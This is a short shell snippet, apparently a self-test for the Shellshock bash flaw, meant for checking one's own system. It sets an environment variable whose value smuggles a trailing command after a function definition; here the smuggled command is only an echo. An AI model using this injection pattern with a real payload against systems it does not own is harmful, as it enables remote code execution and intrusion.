echo "if you see vulnerable and test you're vulneraable, else you aren't vulnerable"
env x='() { :;}; echo vulnerable' bash -c "echo test"
